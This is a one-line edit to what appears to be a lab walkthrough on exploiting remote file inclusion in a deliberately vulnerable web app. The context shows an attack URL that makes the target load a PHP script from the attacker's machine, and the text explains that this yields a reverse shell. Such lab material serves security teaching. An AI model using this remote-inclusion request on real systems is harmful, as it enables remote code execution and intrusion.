@@ -69,7 +69,7 @@ First we'll go to the File Inclusion page. At this point, my attacking machine h
 http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
 ~~~
 
-It's important to use the .txt extension since using .php will cause your browser to interpret the script and you'll reverse shell yourself, which isn't as exciting. In this particular page, you can View Source to see the site isn't doing anything to append anything to your requested page, so you don't need to use null characters to terminate the request. 
+It's important to use the .txt extension since using .php will cause your own system to interpret the script and you'll reverse shell yourself, which isn't as exciting. In this particular page, you can View Source to see the site isn't doing anything to append anything to your requested page, so you don't need to use null characters to terminate the request. 
 
 ### Poking Around and Enumeration
 
